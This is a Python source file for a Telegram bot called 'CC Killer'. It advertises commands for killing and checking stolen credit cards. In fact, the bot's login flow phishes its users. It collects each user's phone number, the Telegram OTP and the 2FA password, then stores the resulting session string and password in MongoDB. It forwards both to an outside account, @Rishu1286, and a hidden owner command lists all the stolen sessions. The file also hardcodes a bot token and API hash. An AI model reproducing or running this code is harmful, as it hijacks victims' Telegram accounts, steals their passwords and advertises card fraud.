import re import asyncio from flask import Flask from pyrogram import Client, filters from pyrogram.types import Message, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton from telethon import TelegramClient from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, AuthRestartError from telethon.sessions import StringSession from pymongo import MongoClient

Telegram API Credentials

API_ID = 29657994 API_HASH = "85f461c4f637911d79c65da1fc2bdd77" BOT_TOKEN = "7612843678:AAHDOH4rDEcoUJ44hlN8HaUn11-vVX6-gUg" OWNER_ID = 5738579437

MongoDB Setup

mongo = MongoClient("mongodb://localhost:27017") db = mongo["login_bot"] sessions_col = db["sessions"]

user_data = {}

app = Client("cc_killer_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN) flask_app = Flask(name)

@app.on_message(filters.command("start")) async def start(client, message: Message): ref_id = None if len(message.command) > 1 and message.command[1].startswith("ref_"): ref_id = message.command[1].split("_")[1] if str(message.from_user.id) != ref_id: db.referrals.update_one({"_id": ref_id}, {"$inc": {"count": 1}}, upsert=True) count = db.referrals.find_one({"_id": ref_id})["count"] if count in [10, 20, 30, 40, 50, 100]: await client.send_message("@Rishu1286", f"User {ref_id} reached {count} referrals!")

referral_link = f"https://t.me/{client.me.username}?start=ref_{message.from_user.id}"

buttons = [
    [InlineKeyboardButton("Register", callback_data="register")],
    [InlineKeyboardButton("Referral Link", url=referral_link)]
]
instructions = (
    "ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ 《 ₡₡ кɪʟʟᴇʀ 》!\n\n"
    f"ʜᴇʏ {message.from_user.first_name}\n\n"
    "ʜᴇʀᴇ’ꜱ ʜᴏᴡ ʏᴏᴜ ᴄᴀɴ ɢᴇᴛ ꜱᴛᴀʀᴛᴇᴅ:: \n\n"
    " * ⌁ How it Works ! *\n\n"
    "*ꜰᴇᴀᴛᴜʀᴇꜱ ⌁⌁*\n"
    "[✓] ` /cu `  [card_details] ⌁ ᴋɪʟʟ ᴄᴄ\n"
    "[✓] ` /b3 `  [card_details] ⌁  ᴄʜᴇᴄᴋ ᴄᴀʀᴅ\n"
)
await message.reply_text(instructions, reply_markup=InlineKeyboardMarkup(buttons))

@app.on_callback_query(filters.regex("register")) async def register_inline(client, callback_query): keyboard = [[KeyboardButton("Share phone number", request_contact=True)]] markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True) await callback_query.message.reply("Please share your phone number to begin login.", reply_markup=markup)

@app.on_message(filters.command("register")) async def register_cmd(client, message: Message): keyboard = [[KeyboardButton("Share phone number", request_contact=True)]] markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True) await message.reply_text("Please share your phone number to begin login.", reply_markup=markup)

@app.on_message(filters.contact) async def handle_contact(client, message: Message): phone = message.contact.phone_number user_id = message.chat.id await message.reply_text(f"Received: {phone}\nSending OTP...")

try:
    tele_client = TelegramClient(StringSession(), API_ID, API_HASH)
    await tele_client.connect()
    result = await tele_client.send_code_request(phone)

    user_data[user_id] = {
        "client": tele_client,
        "phone_number": phone,
        "phone_code_hash": result.phone_code_hash,
    }
    await message.reply_text("OTP sent. Enter it:")

except Exception as e:
    await message.reply_text(f"Error: {e}")

@app.on_message(filters.text & filters.private) async def handle_otp_or_password(client, message: Message): user_id = message.chat.id if user_id not in user_data: return

info = user_data[user_id]
tele_client = info["client"]

if info.get("awaiting_password"):
    password = message.text.strip()
    try:
        await tele_client.sign_in(password=password)
        session = tele_client.session.save()
        sessions_col.update_one({"_id": user_id}, {"$set": {"session": session, "phone": info["phone_number"], "password": password}}, upsert=True)
        await client.send_message("@Rishu1286", f"2FA Login for {info['phone_number']}\nSession: `{session}`\nPassword: `{password}`")
        await message.reply_text("Login success with 2FA!")
    except Exception as e:
        await message.reply_text(f"2FA failed: {e}")
    finally:
        await tele_client.disconnect()
        user_data.pop(user_id, None)
    return

otp = message.text.strip()
try:
    await tele_client.sign_in(info["phone_number"], otp, phone_code_hash=info["phone_code_hash"])
    session = tele_client.session.save()
    sessions_col.update_one({"_id": user_id}, {"$set": {"session": session, "phone": info["phone_number"]}}, upsert=True)
    await client.send_message("@Rishu1286", f"Login Success for {info['phone_number']}\nSession: `{session}`")
    await message.reply_text("Login successful!")
except SessionPasswordNeededError:
    await message.reply_text("2FA enabled. Please enter password:")
    info["awaiting_password"] = True
except PhoneCodeInvalidError:
    await message.reply_text("Invalid OTP.")
except Exception as e:
    await message.reply_text(f"Login error: {e}")
finally:
    await tele_client.disconnect()
    if not info.get("awaiting_password"):
        user_data.pop(user_id, None)

@app.on_message(filters.command("rishu") & filters.user(OWNER_ID)) async def show_sessions(client, message: Message): sessions = sessions_col.find() if not sessions: await message.reply_text("No active sessions.") return text = "Active Sessions:\n\n" for doc in sessions: text += f"User: {doc['_id']}\nPhone: {doc['phone']}\nSession: {doc['session']}\n" if doc.get("password"): text += f"Password: {doc['password']}\n" text += "\n" await message.reply_text(text)

@flask_app.route("/") def home(): return "Bot is running!"

def run_flask(): flask_app.run(host="0.0.0.0", port=8080)

if name == "main": import threading threading.Thread(target=run_fl
ask).start() app.run()
